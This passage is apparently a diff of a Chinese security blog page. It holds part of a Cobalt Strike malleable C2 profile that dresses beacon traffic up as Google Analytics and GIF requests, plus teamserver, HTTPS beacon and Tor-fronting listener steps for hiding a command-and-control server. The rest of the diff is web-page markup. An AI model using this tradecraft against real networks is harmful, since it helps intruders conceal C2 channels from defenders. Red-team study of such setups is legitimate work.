class="string">"-2"</span>;</span><br><span class="line">                        parameter <span class="string">"utmac"</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                output &#123;</span><br><span class="line">                        base64url;</span><br><span class="line">                        prepend <span class="string">"__utma"</span>;</span><br><span class="line">                        parameter <span class="string">"utmcc"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       <span class="built_in"> server </span>&#123;</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line"></span><br><span class="line">                output &#123;</span><br><span class="line">                        prepend <span class="string">"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"</span>;</span><br><span class="line">                        prepend <span class="string">"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"</span>;</span><br><span class="line">                        prepend <span class="string">"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"</span>;</span><br><span class="line">                        print;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># dress up the staging process too</span></span><br><span class="line">http-stager &#123;</span><br><span class="line">       <span class="built_in"> server </span>&#123;</span><br><span class="line">                header <span class="string">"Content-Type"</span> <span class="string">"plain/text"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>在这里需要注意的是，我们需要修改<code>Get</code>以及<code>Post</code>中的<code>Host</code>及<code>Cookie</code>为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。</p>
 </blockquote>
-<p>开启teamserver：<br></p><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  cobal  sudo ./teamserver <span class="string">[your ip]</span> hacktest tor-fronting.profile</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1766px"><div class="progress-images--placeholder" style="padding-bottom: 24.009060022650058%;"></div><img src="/images/loading.svg" alt="1488428820148.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/753479762.png" data-thumb="/images/thumb/71f289b12f275a089d491d41da815d02.png"></div><p></p>
+<p>开启teamserver：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  cobal  sudo ./teamserver <span class="string">[your ip]</span> hacktest tor-fronting.profile</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/753479762.png" alt="1488428820148.png"></p>
 <p>连接到Teamserver，之后创建监听：</p>
-<p></p><div class="progress-images" style="width:656px"><div class="progress-images--placeholder" style="padding-bottom: 68.29268292682927%;"></div><img src="/images/loading.svg" alt="1488433090154.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/1002553669.png" data-thumb="/images/thumb/d91b1f1f3d69f7559719bb47cf38a3ad.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/1002553669.png" alt="1488433090154.png"></p>
 <blockquote>
 <p>因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口<code>一定要改成443</code>。</p>
 </blockquote>
 <p>使用<code>onion.cab</code>:</p>
-<p></p><div class="progress-images" style="width:868px"><div class="progress-images--placeholder" style="padding-bottom: 39.63133640552996%;"></div><img src="/images/loading.svg" alt="1488429012180.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2941190089.png" data-thumb="/images/thumb/62831be3e0c7eda7588e58f099d8b3d4.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/2941190089.png" alt="1488429012180.png"></p>
 <p>生成HTTPS Beacon：</p>
-<p></p><div class="progress-images" style="width:638px"><div class="progress-images--placeholder" style="padding-bottom: 62.69592476489028%;"></div><img src="/images/loading.svg" alt="1488433209395.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2833825097.png" data-thumb="/images/thumb/ef6959423fe8c6e8a59d731719a4f4b2.png"></div><p></p>
-<p>生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。<br>选择Edit：<br></p><div class="progress-images" style="width:2132px"><div class="progress-images--placeholder" style="padding-bottom: 28.705440900562852%;"></div><img src="/images/loading.svg" alt="1488433318535.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2794740122.png" data-thumb="/images/thumb/bdf5e04344800d97bf7f60ad2ad62f89.png"></div><br>修改参数如下：<br><div class="progress-images" style="width:656px"><div class="progress-images--placeholder" style="padding-bottom: 68.29268292682927%;"></div><img src="/images/loading.svg" alt="1488433374140.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/386985194.png" data-thumb="/images/thumb/727548947bc2bccca76f02ff88ea9e3b.png"></div><br>保存之后，运行HTTPS beacon，成功上线：<p></p>
-<p></p><div class="progress-images" style="width:1676px"><div class="progress-images--placeholder" style="padding-bottom: 70.16706443914082%;"></div><img src="/images/loading.svg" alt="1488433659445.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/03/2358579381.png" data-thumb="/images/thumb/135c65d0a5e8e44eadb6e792f96921db.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/2833825097.png" alt="1488433209395.png"></p>
+<p>生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。<br>选择Edit：<br><img src="https://evi1cg.github.io/usr/uploads/2017/03/2794740122.png" alt="1488433318535.png"><br>修改参数如下：<br><img src="https://evi1cg.github.io/usr/uploads/2017/03/386985194.png" alt="1488433374140.png"><br>保存之后，运行HTTPS beacon，成功上线：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/03/2358579381.png" alt="1488433659445.png"></p>
 <p>DEMO:</p>
 <p><a href="https://www.youtube.com/watch?v=I3ovfrqcF0I" target="_blank" rel="noopener">https://www.youtube.com/watch?v=I3ovfrqcF0I</a></p>
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>使用Tor Fronting 有以下几个特点：<br>1、你<code>不需要外网环境</code>，将C2放到Docker或者本地都可以！（但是需要服务器在墙外）<br>2、使C2匿名；<br>3、并不需要在目标机上安装Tor；<br>4、默认是安全的。<br>5、要求C2上同时安装Cobalt Strike及Tor服务。<br>通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。</p>
@@ -899,7 +916,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -910,7 +927,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -921,7 +938,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -932,7 +949,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -984,7 +1001,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1046,8 +1063,6 @@
 
 
 
-  
-
 
 
 
@@ -1076,9 +1091,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1522,11 +1534,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1666,6 +1673,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
